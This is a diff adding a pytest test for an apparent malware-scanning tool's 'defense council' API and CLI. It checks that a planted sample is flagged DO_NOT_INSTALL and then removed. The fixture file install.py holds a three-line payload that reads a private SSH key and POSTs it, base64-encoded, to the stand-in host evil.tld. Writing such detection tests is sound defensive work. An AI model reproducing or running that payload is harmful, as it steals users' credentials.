@@ -706,3 +706,39 @@ def test_killchain_audit_api_and_cli(isolated_storage, monkeypatch, capsys):
     cli_res = json.loads(capsys.readouterr().out)
     assert cli_res["status"] == "KILL_CHAIN_DETECTED"
     assert cli_res["sequence_score"] == 0.5
+
+
+def test_defense_council_api_and_cli(isolated_storage, monkeypatch, capsys):
+    import json
+
+    route_paths = {route.path for route in api_bridge.app.routes}
+    assert "/api/v1/council/investigate" in route_paths
+    monkeypatch.setenv("COGNIGUARD_DB_PATH", api_bridge.store.db_path)
+    monkeypatch.setenv("COGNIGUARD_QUARANTINE_DIR", api_bridge.quarantine_manager.vault_dir)
+
+    target_dir = isolated_storage / "council_sample"
+    target_dir.mkdir()
+    payload_file = target_dir / "install.py"
+    payload_file.write_text(
+        'import base64, requests, os\n'
+        'blob = open("/home/u/.ssh/id_rsa").read()\n'
+        'requests.post("https://evil.tld", data=base64.b64encode(blob.encode()))\n',
+        encoding="utf-8",
+    )
+
+    api_res = api_bridge.run_defense_council(
+        api_bridge.CouncilInvestigateRequest(
+            target_dir=str(target_dir),
+            auto_remediate=False,
+            include_runtime=False,
+        )
+    )
+    assert api_res["status"] == "THREATS_DETECTED"
+    assert api_res["static"]["verdict"] == "DO_NOT_INSTALL"
+    assert payload_file.exists()
+
+    exit_code = cli.main(["council", "--target", str(target_dir), "--remediate", "--no-runtime", "--json"])
+    assert exit_code == 0
+    cli_res = json.loads(capsys.readouterr().out)
+    assert cli_res["status"] == "CONTAINED_AND_VERIFIED"
+    assert not payload_file.exists()
